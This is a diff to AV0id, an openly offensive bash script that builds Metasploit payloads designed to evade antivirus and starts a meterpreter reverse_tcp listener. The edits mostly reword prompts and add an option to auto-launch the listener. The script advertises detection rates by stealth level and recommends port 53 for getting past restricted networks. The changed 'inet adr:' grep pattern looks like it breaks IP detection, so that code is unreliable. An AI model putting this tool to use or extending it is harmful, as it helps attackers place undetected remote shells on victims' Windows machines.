@@ -65,7 +65,7 @@ clear
 echo ""
 echo -e "\e[00;32m##################################################################\e[00m"
 echo ""
-echo -e "*** \e[01;31mAV\e[00m\e[01;32m0id\e[00m - Metasploit Shell A.V Avoider Version $VERSION  ***"
+echo -e "*** \e[01;31mAV\e[00m\e[01;32m0id\e[00m - Metasploit Shell A.V. Avoider Version $VERSION  ***"
 echo ""
 echo -e "\e[00;32m##################################################################\e[00m"
 echo ""
@@ -152,8 +152,8 @@ echo ""
 		then
 			echo ""
 			IPINT=$(ifconfig | grep "eth" | cut -d " " -f 1 | head -1)
-			IP=$(ifconfig "$IPINT" |grep "inet addr:" |cut -d ":" -f 2 |awk '{ print $1 }')
-			echo -e "\e[01;32m[-]\e[00m Local system selected, I will auto launch the listener for you on \e[01;32m"$IP"\e[00m"
+			IP=$(ifconfig "$IPINT" |grep "inet adr:" |cut -d ":" -f 2 |awk '{ print $1 }')
+			echo -e "\e[01;32m[-]\e[00m Local system selected, listener will be launched on \e[01;32m$IP\e[00m using interface \e[01;32m$IPINT\e[00m"
 			echo ""
 			echo -e "\e[1;31m-------------------------------------------------------\e[00m"
 			echo -e "\e[01;31m[?]\e[00m What port number do you want to listen on?"
@@ -165,7 +165,7 @@ echo ""
 	elif [ "$INTEXT" = "2" ]
 		then
 			echo ""
-			echo -e "\e[01;32m[-]\e[00m Alternative system selected, I will not auto launch but provide you the code"
+			echo -e "\e[01;32m[-]\e[00m Alternative system selected"
 			echo ""
 			echo -e "\e[1;31m--------------------------------------------------------------------\e[00m"
 			echo -e "\e[01;31m[?]\e[00m What IP address to you want the listener to run on?"
@@ -176,7 +176,7 @@ echo ""
 			echo ""
 			echo ""
 			echo -e "\e[1;31m---------------------------------------------------------------------------------------------------------\e[00m"
-			echo -e "\e[01;31m[?]\e[00m What port number do you want to listen on? - if on the internet try port 53 if restricted"
+			echo -e "\e[01;31m[?]\e[00m What port number do you want to listen on? If on the internet try port 53 if restricted"
 			echo -e "\e[1;31m---------------------------------------------------------------------------------------------------------\e[00m"
 			echo ""
 			echo -ne "\e[01;32m>\e[00m "
@@ -197,7 +197,7 @@ echo ""
 echo ""
 # Menu
 echo -e "\e[1;31m--------------------------------------------------------------------------------------------\e[00m"
-echo -e "\e[01;31m[?]\e[00m How stealthy do you want the file? - enter 1, 2, 3, 4 or 5 and press enter"
+echo -e "\e[01;31m[?]\e[00m How stealthy do you want the file? Enter 1, 2, 3, 4 or 5 and press enter"
 echo -e "\e[1;31m--------------------------------------------------------------------------------------------\e[00m"
 echo ""
 echo " 1. Normal - about 400K payoad  - fast compile - 13/46 A.V products detected as malicious"
@@ -326,9 +326,22 @@ rm msf.c >/dev/null 2>&1
 
 echo ""
 sleep 2
+echo -e "\e[1;31m--------------------------------------------------------------------------------------------\e[00m"
+echo -e "\e[01;31m[?]\e[00m Do you want the listener to be loaded automatically? Enter 1 or 2 and press enter"
+echo -e "\e[1;31m--------------------------------------------------------------------------------------------\e[00m"
+echo ""
+echo " 1. Yes"
+echo ""
+echo " 2. No"
+echo ""
+echo -e "\e[1;31m----------------------------------------------------------------------------------------------\e[00m"
+echo ""
+echo -ne "\e[01;32m>\e[00m "
+read INTEXT
+echo ""
 	if [ "$INTEXT" = "1" ]
 		then
-			echo -e "\e[01;32m[-]\e[00m Loading the Metasploit listener, please wait..."
+			echo -e "\e[01;32m[-]\e[00m Loading the Metasploit listener on \e[01;32m$IP:$PORT\e[00m, please wait..."
 			echo ""
 			$MSFCLI exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST="$IP" LPORT="$PORT" E 2>/dev/null
 		else
